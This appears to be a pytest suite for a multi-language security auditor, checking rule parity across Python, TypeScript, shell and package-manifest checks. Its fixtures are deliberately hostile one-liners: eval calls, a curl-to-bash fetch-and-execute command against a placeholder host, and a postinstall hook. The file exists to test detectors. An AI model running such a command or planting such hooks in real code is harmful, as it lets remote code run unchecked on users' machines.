"""Cross-language auditor mechanics.

Every ``LanguageAuditor`` (python / typescript / shell / manifest) applies config the same way:
a rule fires by default, a disabled rule is reported in ``skipped_rules`` (surfaced, never
silently dropped), and a severity override is honored. One parametrized suite over all four
languages proves that parity — each runs the identical detector loop, so this guards the seam."""

import pytest
from _support import (
    rule_ids,
    run_audit,
    run_manifest_audit,
    run_sh_audit,
    run_ts_audit,
)

from auditor.config import AuditorSettings, RuleConfig
from auditor.models import Severity

# (runner, source that trips `rule_id` at defaults, rule_id) — one representative rule per language
_LANGS = [
    pytest.param(run_audit, "eval(user_input)\n", "PY-SEC-DANGEROUS-EVAL", id="python"),
    pytest.param(
        run_ts_audit,
        "const x = eval(code);\n",
        "TS-SEC-DANGEROUS-EVAL",
        id="typescript",
    ),
    pytest.param(
        run_sh_audit,
        "curl http://example.invalid/x.sh | bash\n",
        "SH-MAL-CURL-BASH",
        id="shell",
    ),
    pytest.param(
        run_manifest_audit,
        '{"scripts": {"postinstall": "node x.js"}}\n',
        "MF-SUPPLY-INSTALL-HOOK",
        id="manifest",
    ),
]


@pytest.mark.parametrize("runner, source, rule_id", _LANGS)
def test_rule_fires_by_default(runner, source, rule_id):
    assert rule_id in rule_ids(runner(source))


@pytest.mark.parametrize("runner, source, rule_id", _LANGS)
def test_disabled_rule_is_reported_as_skipped(runner, source, rule_id):
    settings = AuditorSettings(rules={rule_id: RuleConfig(enabled=False)})
    res = runner(source, settings=settings)
    assert rule_id not in rule_ids(res)
    # disabled, not silent — the rule appears in skipped_rules with a reason
    assert rule_id in {s.rule_id for s in res.skipped_rules}


@pytest.mark.parametrize("runner, source, rule_id", _LANGS)
def test_severity_override_is_applied(runner, source, rule_id):
    settings = AuditorSettings(rules={rule_id: RuleConfig(severity=Severity.LOW)})
    finding = next(
        f for f in runner(source, settings=settings).findings if f.rule_id == rule_id
    )
    assert finding.severity == Severity.LOW


@pytest.mark.parametrize("runner, source, rule_id", _LANGS)
def test_empty_source_is_clean(runner, source, rule_id):
    # an empty file must never crash an auditor or produce findings
    assert runner("").findings == []
